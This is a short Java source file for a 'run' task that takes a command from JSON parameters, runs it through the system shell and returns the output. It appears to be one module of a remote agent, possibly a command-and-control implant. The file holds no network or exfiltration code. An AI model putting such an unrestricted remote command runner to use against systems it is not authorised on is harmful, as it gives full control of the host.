package com.woopsie.tasks;

import com.fasterxml.jackson.databind.JsonNode;
import com.woopsie.Config;

import java.io.BufferedReader;
import java.io.InputStreamReader;

/**
 * Execute shell command task
 */
public class RunTask implements Task {
    
    @Override
    public String execute(Config config, JsonNode parameters) throws Exception {
        // Extract executable and arguments from JSON
        String executable = "default";
        String arguments = "";
        
        if (parameters != null) {
            if (parameters.has("executable")) {
                executable = parameters.get("executable").asText();
            }
            if (parameters.has("arguments")) {
                arguments = parameters.get("arguments").asText();
            }
        }
        
        String command;
        if ("default".equals(executable)) {
            command = arguments;
        } else {
            command = executable + (arguments.isEmpty() ? "" : " " + arguments);
        }
        
        Config.debugLog(config, "Executing run command: " + command);
        
        ProcessBuilder processBuilder = new ProcessBuilder();
        
        // Determine shell based on OS
        String os = System.getProperty("os.name").toLowerCase();
        if (os.contains("win")) {
            processBuilder.command("cmd.exe", "/c", command);
        } else {
            processBuilder.command("sh", "-c", command);
        }
        
        processBuilder.redirectErrorStream(true);
        Process process = processBuilder.start();
        
        // Read output
        StringBuilder output = new StringBuilder();
        try (BufferedReader reader = new BufferedReader(
                new InputStreamReader(process.getInputStream()))) {
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }
        }
        
        int exitCode = process.waitFor();
        
        if (output.length() == 0) {
            output.append("Process exited with code: ").append(exitCode);
        }
        
        Config.debugLog(config, "Run command completed, exit code: " + exitCode + 
                       ", output length: " + output.length() + " bytes");
        
        return output.toString();
    }
    
    @Override
    public String getCommandName() {
        return "run";
    }
}
